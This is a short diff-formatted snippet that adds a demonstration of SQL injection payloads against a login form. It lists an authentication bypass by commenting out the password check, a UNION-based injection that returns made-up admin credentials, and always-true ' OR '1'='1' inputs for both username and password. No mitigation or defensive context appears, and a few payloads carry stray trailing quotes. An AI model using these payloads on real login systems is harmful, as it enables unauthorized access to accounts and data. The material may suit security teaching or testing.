@@ -1,0 +1,19 @@
+Now let's demonstrate the SQL injection attack with common payloads:
+>>
+Basic Authentication Bypass:
+
+Username: admin'--'
+Password: 'anything'
+This comment out the password check
+>>
+UNION Based Injection:
+
+Username: ' UNION SELECT 1,'admin','admin123'--'
+Password: anything
+>>
+Always True Condition:
+
+Username: ' OR '1'='1'
+Password: ' OR '1'='1'
+
+
